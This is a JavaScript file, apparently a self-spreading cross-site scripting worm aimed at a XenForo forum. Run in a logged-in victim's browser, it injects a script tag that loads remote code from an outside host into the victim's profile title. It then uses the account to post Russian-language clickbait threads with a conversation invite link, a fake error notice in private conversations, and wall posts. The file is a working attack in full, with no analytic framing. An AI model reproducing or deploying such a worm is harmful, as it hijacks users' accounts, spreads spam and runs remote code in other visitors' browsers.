/*

████████╗███████╗███████╗████████╗███████╗██████╗ ███████╗    ██╗   ██╗██╗  ██╗
╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝    ██║   ██║██║  ██║
   ██║   █████╗  ███████╗   ██║   █████╗  ██████╔╝███████╗    ██║   ██║███████║
   ██║   ██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗╚════██║    ╚██╗ ██╔╝╚════██║
   ██║   ███████╗███████║   ██║   ███████╗██║  ██║███████║     ╚████╔╝      ██║
   ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝      ╚═══╝       ╚═╝

*/
(async function() {
  'use strict';
  const payload = "<script src='//niks&#46;dev/1.js'>"
  
  async function main() {
    if (localStorage.getItem('sahgfdhdy')){
      return;
    }
    
    const ajaxData = await XenForo.ajax("account/personal-details");
    let custom_title = $(ajaxData.templateHtml).find("#ctrl_custom_title").val();
    
    if (custom_title.length < 64-payload.length) {
      await XenForo.ajax("account/status-update", {custom_title: custom_title+payload});
    }
    
    let invite = "https://lolz.live/conversations/join/q6qwb_ZsPz29Y6wL8VYg6w63MeU"
    let button = `[button=${invite}]клик[/button]`
    let messages = [
      `Шок! Узнал, кто на самом деле стоит за разработкой форума. Не пропусти, пока ссылку не убрали — ${invite}. Смотри мою карточку профиля, там всё сказано!`,
      `Залетай в чат с разработчиками форума, там уже обсуждают секреты. Ты не поверишь, что они скрывают! — ${button}. Ну и моя карточка профиля тоже расскажет многое!`,
      `Как на самом деле устроен форум и что разработчики не хотят, чтобы ты знал. Всё в беседе — ${invite}. Смотри мою карточку профиля, она все объяснит!`,
      `Кто реально в теме, тот уже разобрался. Загляни в чат разработчиков  — ${button}. А ещё мою карточку профиля — она тоже о многом говорит!`,
      `Вот где настоящие инсайды! Разработчики форума пообщались откровенно — пока не удалили ${invite}. Смотри мою карточку профиля, не всё так просто!`,
      `Не упусти! Всё, что скрывают разработчики форума, прямо в чате. Смотри мою карточку профиля, и всё станет ясно!`
    ];

    let titles = [
      `Шок! Найден фурри-чат разрабов!`,
      `Ого, посмотрите, нашел чат с фурри`,
      `Нашел необычный чат на форуме!`,
      `Разработчики дуреют с этой прикормки`,
      `Слили чат с фурри-юзерами форума`,
      `Слили чат разработчиков форума`,
      `Тут фурри`
    ];

    let thread_message = messages[Math.floor(Math.random()*messages.length)];
    let thread_title = titles[Math.floor(Math.random()*titles.length)];
    
    await XenForo.ajax("forums/8/add-thread", {title: thread_title, message: thread_message});
    if (Im.conversationId) {
      let message = "Извините, в личных сообщениях форума произошла ошибка.  Для выхода, пожалуйста, нажмите кнопку \"Покинуть переписку\"."
      await XenForo.ajax(`conversations/${Im.conversationId}/insert-reply`, {message_html: message})
    }

    await XenForo.ajax(`/members/${XenForo.visitor.user_id}/post`, {message_html: 'Кажется, что-то случилось с моим статусом! Надо исправить!'});
    await XenForo.ajax('/rays/post',{message_html: '<p>гриша извини</p><p>[img]https://i.ibb.co/8gD1VmnC/1000081369.jpg[/img]</p>'});
    localStorage.setItem('sahgfdhdy', true)
  }
  
  await main();
})();
/*
            _     _             _            _       _ 
           (_)   | |           (_)          (_)     (_)
  __ _ _ __ _ ___| |__   __ _   _ ______   ___ _ __  _ 
 / _` | '__| / __| '_ \ / _` | | |_  /\ \ / / | '_ \| |
| (_| | |  | \__ \ | | | (_| | | |/ /  \ V /| | | | | |
 \__, |_|  |_|___/_| |_|\__,_| |_/___|  \_/ |_|_| |_|_|
  __/ |                                                
 |___/                                                 

*/
